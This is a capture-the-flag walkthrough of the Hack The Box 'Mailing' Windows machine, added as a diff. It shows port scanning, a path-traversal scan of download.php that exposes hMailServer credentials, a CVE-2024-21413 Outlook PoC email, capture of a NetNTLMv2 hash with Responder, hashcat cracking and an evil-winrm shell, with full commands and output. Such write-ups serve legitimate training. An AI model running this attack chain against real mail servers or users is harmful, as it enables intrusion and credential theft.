@@ -1,0 +1,465 @@
+---
+title: Mailing
+banner: /avatars/mailing.webp
+difficulty: easy
+os: windows
+releaseDate: 2024-05-04
+pwnDate: 2024-05-00
+slug: "mailing"
+achievement: 
+---
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+```bash
+sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn --disable-arp-ping 10.10.11.14 -oG allPorts
+
+PORT      STATE SERVICE      REASON
+25/tcp    open  smtp         syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+110/tcp   open  pop3         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+143/tcp   open  imap         syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+465/tcp   open  smtps        syn-ack ttl 127
+587/tcp   open  submission   syn-ack ttl 127
+993/tcp   open  imaps        syn-ack ttl 127
+5040/tcp  open  unknown      syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+7680/tcp  open  pando-pub    syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+59433/tcp open  unknown      syn-ack ttl 127
+```
+
+```bash
+sudo nmap -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,59433 -sCV 10.10.11.14 -oN targeted
+
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Did not follow redirect to http://mailing.htb
+110/tcp   open  pop3          hMailServer pop3d
+|_pop3-capabilities: UIDL USER TOP
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+143/tcp   open  imap          hMailServer imapd
+|_imap-capabilities: CAPABILITY ACL SORT IDLE IMAP4 QUOTA RIGHTS=texkA0001 CHILDREN completed OK NAMESPACE IMAP4rev1
+445/tcp   open  microsoft-ds?
+465/tcp   open  ssl/smtp      hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+587/tcp   open  smtp          hMailServer smtpd
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+993/tcp   open  ssl/imap      hMailServer imapd
+| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
+| Not valid before: 2024-02-27T18:24:10
+|_Not valid after:  2029-10-06T18:24:10
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: CAPABILITY ACL SORT IDLE IMAP4 QUOTA RIGHTS=texkA0001 CHILDREN completed OK NAMESPACE IMAP4rev1
+5040/tcp  open  unknown
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+7680/tcp  open  pando-pub?
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+59433/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-05-07T10:08:33
+|_  start_date: N/A
+```
+
+```bash
+sudo echo "10.10.11.14 mailing.htb" >> /etc/hosts
+```
+
+<Browser
+  url="10.10.11.14"
+  src="/walkthroughs/mailing/0.png"
+/>
+
+| Name | Department |
+| ---- | ---------- |
+| Ruy Alonso | IT Team |
+| Maya Bendito | Support Team |
+| Gregory Smith | Founder and CEO |
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u "http://mailing.htb/FUZZ"
+
+        /'___\  /'___\           / ___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://mailing.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+assets                  [Status: 301, Size: 159, Words: 9, Lines: 2]
+index.php               [Status: 200, Size: 4681, Words: 1535, Lines: 133]
+instructions            [Status: 301, Size: 165, Words: 9, Lines: 2]
+:: Progress: [4727/4727] :: Job [1/1] :: 787 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
+```
+
+## Foothold
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt -u "http://mailing.htb/download.php?file=FUZZ" -fs 15
+
+        /'___\  /'___\           / ___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://mailing.htb/download.php?file=FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: 15
+________________________________________________
+
+C:..\..\..\..\..\..\Windows\system32\drivers\etc\hosts [Status: 200, Size: 849, Words: 172, Lines: 24]
+<...SNIP...>
+RANDOMDIR../../../../Windows/system32/drivers/etc/hosts [Status: 200, Size: 849, Words: 172, Lines: 24]
+:: Progress: [215/215] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+```
+
+```
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+# This file contains the mappings of IP addresses to host names. Each
+# entry should be kept on an individual line. The IP address should
+# be placed in the first column followed by the corresponding host name.
+# The IP address and the host name should be separated by at least one
+# space.
+#
+# Additionally, comments (such as these) may be inserted on individual
+# lines or following the machine name denoted by a '#' symbol.
+#
+# For example:
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+
+127.0.0.1	mailing.htb
+```
+
+## Exploitation
+
+Looking for the location of the hmailserver configuration file in the browser, we found these possible paths:
+- `C:\Program Files\hMailServer\Data`
+- `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`
+
+![burpsuite hMailServer config file](/walkthroughs/mailing/1.png)
+
+```ini
+[Directories]
+ProgramFolder=C:\Program Files (x86)\hMailServer
+DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
+DataFolder=C:\Program Files (x86)\hMailServer\Data
+LogFolder=C:\Program Files (x86)\hMailServer\Logs
+TempFolder=C:\Program Files (x86)\hMailServer\Temp
+EventFolder=C:\Program Files (x86)\hMailServer\Events
+[GUILanguages]
+ValidLanguages=english,swedish
+[Security]
+AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
+[Database]
+Type=MSSQLCE
+Username=
+Password=0a9f8ad8bf896b501dde74f08efd7e4c
+PasswordEncryption=1
+Port=0
+Server=
+Database=hMailServer
+Internal=1
+```
+
+https://crackstation.net/
+
+| Hash | Type | Result |
+| ---- | ---- | ------ | 
+| 841bb5acfa6779ae432fd7a4e6600ba7 | md5 | homenetworkingadministrator | 
+| 0a9f8ad8bf896b501dde74f08efd7e4c | Unknown | Not found. | 
+
+https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/tree/main
+
+```bash
+python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url 10.10.11.14 --subject exploit
+
+CVE-2024-21413 | Microsoft Outlook Remote Code Execution Vulnerability PoC.
+Alexander Hagenah / @xaitax / ah@primepage.de                                                                   
+
+✅ Email sent successfully.
+```
+
+https://github.com/lgandx/Responder
+
+```bash
+sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.4.0
+
+  To support this project:
+  Github -> https://github.com/sponsors/lgandx
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.7]
+    Responder IPv6             [dead:beef:2::1005]
+    Challenge set              [random]
+    Dont Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-1PAWE1NL4SH]
+    Responder Domain Name      [UZTZ.LOCAL]
+    Responder DCE-RPC Port     [49485]
+
+[+] Listening for events...                                                                                     
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.14
+[SMB] NTLMv2-SSP Username : MAILING\maya
+[SMB] NTLMv2-SSP Hash     : maya::MAILING:d3960134b3f9567d:472162304C11627880D634C11E417411:01010000000000008020ED6355A0DA01C35301F11A9E2AE8000000000200080055005A0054005A0001001E00570049004E002D003100500041005700450031004E004C0034005300480004003400570049004E002D003100500041005700450031004E004C003400530048002E0055005A0054005A002E004C004F00430041004C000300140055005A0054005A002E004C004F00430041004C000500140055005A0054005A002E004C004F00430041004C00070008008020ED6355A0DA01060004000200000008003000300000000000000000000000002000006D7721DC72BAE0F10CA72A04A239BC3CEF045EFEFA402220D04537F4541BF2D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+[*] Skipping previously captured hash for MAILING\maya
+```
+
+```
+maya::MAILING:d3960134b3f9567d:472162304C11627880D634C11E417411:01010000000000008020ED6355A0DA01C35301F11A9E2AE8000000000200080055005A0054005A0001001E00570049004E002D003100500041005700450031004E004C0034005300480004003400570049004E002D003100500041005700450031004E004C003400530048002E0055005A0054005A002E004C004F00430041004C000300140055005A0054005A002E004C004F00430041004C000500140055005A0054005A002E004C004F00430041004C00070008008020ED6355A0DA01060004000200000008003000300000000000000000000000002000006D7721DC72BAE0F10CA72A04A239BC3CEF045EFEFA402220D04537F4541BF2D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000
+```
+
+```bash
+hashid hash
+
+--File 'hash'--
+Analyzing 'maya::MAILING:d3960134b3f9567d:472162304C11627880D634C11E417411:01010000000000008020ED6355A0DA01C35301F11A9E2AE8000000000200080055005A0054005A0001001E00570049004E002D003100500041005700450031004E004C0034005300480004003400570049004E002D003100500041005700450031004E004C003400530048002E0055005A0054005A002E004C004F00430041004C000300140055005A0054005A002E004C004F00430041004C000500140055005A0054005A002E004C004F00430041004C00070008008020ED6355A0DA01060004000200000008003000300000000000000000000000002000006D7721DC72BAE0F10CA72A04A239BC3CEF045EFEFA402220D04537F4541BF2D10A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0037000000000000000000'
+[+] NetNTLMv2 
+--End of file 'hash'--
+```
+
+```bash
+hashcat --help | grep NetNTLMv2
+
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+```
+
+```bash
+hashcat -a 0 -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+MAYA::MAILING:d3960134b3f9567d:472162304c11627880d634c11e417411:01010000000000008020ed6355a0da01c35301f11a9e2ae8000000000200080055005a0054005a0001001e00570049004e002d003100500041005700450031004e004c0034005300480004003400570049004e002d003100500041005700450031004e004c003400530048002e0055005a0054005a002e004c004f00430041004c000300140055005a0054005a002e004c004f00430041004c000500140055005a0054005a002e004c004f00430041004c00070008008020ed6355a0da01060004000200000008003000300000000000000000000000002000006d7721dc72bae0f10ca72a04a239bc3cef045efefa402220d04537f4541bf2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0037000000000000000000:m4y4ngs4ri
+```
+
+`maya:m4y4ngs4ri`
+
+```bash
+evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\maya\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\maya\Desktop> dir
+
+
+    Directory: C:\Users\maya\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/28/2024   7:34 PM           2350 Microsoft Edge.lnk
+-ar---          5/6/2024   9:39 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\maya\Desktop> more user.txt
+e6ab9fac675d9f2d2db0f0de49d3b2e0
+```
+
+## Privilege Escalation
+
+```bash
+*Evil-WinRM* PS C:\Users\maya\Documents> net user maya
+User name                    maya
+Full Name
+Comment
+User s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2024-04-12 4:16:20 AM
+Password expires             Never
+Password changeable          2024-04-12 4:16:20 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   2024-05-07 2:59:03 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use*Usuarios
+                             *Usuarios de escritori
+Global Group memberships     *Ninguno
+The command completed successfully.
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\maya\Documents> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrador            DefaultAccount           Invitado
+localadmin               maya                     WDAGUtilityAccount
+The command completed with one or more errors.
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\maya\Documents>net localgroup
+
+Aliases for \\MAILING
+
+-------------------------------------------------------------------------------
+*Administradores
+*Administradores de Hyper-V
+*Duplicadores
+*IIS_IUSRS
+*Invitados
+*Lectores del registro de eventos
+*Operadores criptogr ficos
+*Operadores de asistencia de control de acceso
+*Operadores de configuraci¢n de red
+*Operadores de copia de seguridad
+*Propietarios del dispositivo
+*Remote Management Users
+*System Managed Accounts Group
+*Usuarios
+*Usuarios avanzados
+*Usuarios COM distribuidos
+*Usuarios de escritorio remoto
+*Usuarios del monitor de sistema
+*Usuarios del registro de rendimiento
+The command completed successfully.
+```
